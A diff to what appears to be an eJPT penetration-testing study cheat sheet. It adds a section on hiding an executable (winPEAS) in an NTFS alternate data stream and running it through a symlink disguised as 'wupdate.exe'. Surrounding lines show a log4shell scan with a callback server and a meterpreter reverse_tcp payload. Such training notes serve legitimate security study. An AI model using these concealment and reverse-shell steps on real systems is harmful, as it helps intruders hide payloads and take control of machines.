@@ -36,6 +36,7 @@ Info about eJPT certification [here](https://security.ine.com/certifications/ejp
 - [Windows Kernel Exploits](#Windows-Kernel-Exploits)
 - [Bypassing UAC with UACMe](#Bypassing-UAC-with-UACMe)
 - [Access Token Impersonation](#Access-Token-Impersonation)
+- [hide payload in window](#hide-payload-in-window)
 - [Searching for Passwords In Windows Configuration Files](#Searching-for-Passwords-In-Windows-Configuration-Files)
 - [Dumping hashes with Mimikatz](#Dumping-hashes-with-Mimikatz)
 - [Pass-The-Hash](#Pass-The-Hash)
@@ -389,6 +390,26 @@ nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:
 ```shell
 set payload windows/meterpreter/reverse_tcp
 ```
+
+#### hide payload in window
+```shell
+cd Desktop
+notepad test.txt:secret.txt
+```
+> in window cmd
+
+```shell
+cd Temp
+type payload.exe > windowing.txt:winpeas.exe
+start windowing.txt:winpeas.exe
+```
+> for payload hide. if we hide this in some file it show storage 0
+
+```shell
+mklink wupdate.exe C:\Temp\windowing.txt:winpeas.exe
+wupdate
+```
+> if it not start direct then we this to create symbolic link and then start
 
 #### Setup of autopwn
 ```shell
